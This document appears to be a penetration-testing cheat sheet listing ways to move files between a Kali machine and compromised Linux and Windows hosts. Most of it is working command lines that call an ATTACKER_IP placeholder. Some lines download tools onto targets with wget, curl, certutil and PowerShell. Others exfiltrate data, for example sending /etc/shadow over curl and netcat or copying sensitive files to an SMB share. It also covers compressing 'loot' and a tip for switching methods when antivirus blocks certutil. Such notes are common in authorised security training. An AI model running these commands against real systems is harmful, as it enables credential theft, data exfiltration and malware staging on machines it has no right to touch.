# File Transfer Methods
---

## Serving Files from Kali

### HTTP Server (Most common)

```bash
# Simple HTTP server
python3 -m http.server 80

# Specific directory
cd /opt/tools
python3 -m http.server 8000

# With upload capability (using uploadserver)
pip3 install uploadserver
python3 -m uploadserver 80
```

### SMB Server

```bash
# Impacket SMB server
impacket-smbserver share . -smb2support

# With authentication
impacket-smbserver share . -smb2support -user user -password pass
```

### FTP Server

```bash
# Quick Python FTP
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 -w
```

---

## Download TO Linux Target

### wget
```bash
wget http://ATTACKER_IP/file
wget http://ATTACKER_IP/file -O /tmp/file
```

### curl
```bash
curl http://ATTACKER_IP/file -o file
curl http://ATTACKER_IP/file --output /tmp/file
```

### If No wget/curl

**Python:**
```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://ATTACKER_IP/file", "file")'
```

**Netcat:**
```bash
# On Kali:
nc -lvnp 4444 < file

# On target:
nc ATTACKER_IP 4444 > file
```

---

## Download TO Windows Target

### certutil (Built-in)

```powershell
certutil -urlcache -f http://ATTACKER_IP/file.exe file.exe
```

### PowerShell

```powershell
# Invoke-WebRequest
Invoke-WebRequest -Uri "http://ATTACKER_IP/file.exe" -OutFile "file.exe"

# DownloadFile
(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_IP/file.exe", "file.exe")

# Short version
iwr -uri http://ATTACKER_IP/file.exe -outfile file.exe
```

### SMB

```powershell
# If you have SMB server running on Kali
copy \\ATTACKER_IP\share\file.exe C:\Temp\file.exe
```

---

## Upload FROM Linux Target

### HTTP POST

```bash
# On Kali (with uploadserver)
python3 -m uploadserver 80

# On target
curl -X POST -F "file=@/etc/shadow" http://ATTACKER_IP/upload
```

### Netcat

```bash
# On Kali:
nc -lvnp 4444 > received_file

# On target:
nc ATTACKER_IP 4444 < /etc/shadow
```

---

## Upload FROM Windows Target

### SMB (Easiest)

```bash
# On Kali:
impacket-smbserver share . -smb2support
```

```powershell
# On Windows:
copy C:\sensitive\file.txt \\ATTACKER_IP\share\file.txt
```

### PowerShell Upload

```powershell
# Upload to web server (if you have one accepting uploads)
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/upload" -Method POST -InFile "C:\data.txt"
```

---

## Large File Transfers

### Compression First

**Linux:**
```bash
# Compress before transfer
tar -czf loot.tar.gz /var/www/html/
# Then transfer loot.tar.gz
```

**Windows:**
```powershell
# Zip files
Compress-Archive -Path C:\sensitive\* -DestinationPath C:\Temp\loot.zip
# Then transfer loot.zip
```
---

## Troubleshooting

**"wget/curl not available on target"**
→ Try Python, Netcat, or PowerShell methods

**"certutil blocked by AV"**
→ Try PowerShell Invoke-WebRequest

**"Can't establish SMB connection"**
→ Check firewall, try HTTP instead

**"Transfer times out"**
→ File too large, compress first or split into chunks

---
